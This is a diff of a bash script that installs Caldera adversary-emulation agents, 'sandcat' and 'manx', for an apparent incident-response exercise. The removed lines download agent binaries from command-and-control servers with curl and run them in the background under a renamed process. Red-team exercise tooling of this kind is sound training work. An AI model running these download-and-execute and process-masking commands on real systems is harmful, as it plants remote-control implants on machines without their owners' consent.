@@ -11,20 +11,8 @@ read -p "Enter the second Caldera's socket: " socket
 read -p "Enter the second agent process name: " agent2
 
 
-echo "installing first agent"
-
-#Get the main, louder sandcat agent
-curl -s -X POST -H "file:sandcat.go" -H "platform:linux" $server1/file/download > $agent1
-chmod +x $agent1
-( exec -a "$agent1" "./$agent1" -server "$server1" -group ir-exercise ) &
-
-
-echo "installing second agent"
-#Get the quieter manx agent
-contact="tcp"
-curl -s -X POST -H "file:manx.go" -H "platform:linux" $server2/file/download > $agent2
-chmod +x $agent2
-( exec -a "$agent2" "./$agent2" -http "$server2" -socket "$socket" -contact "$contact" -v ) &
+bash sandcat $server1 $agent1
+bash manx $server2 $socket $agent2
 
 echo "agents installed, cleaning up"
 sleep 5
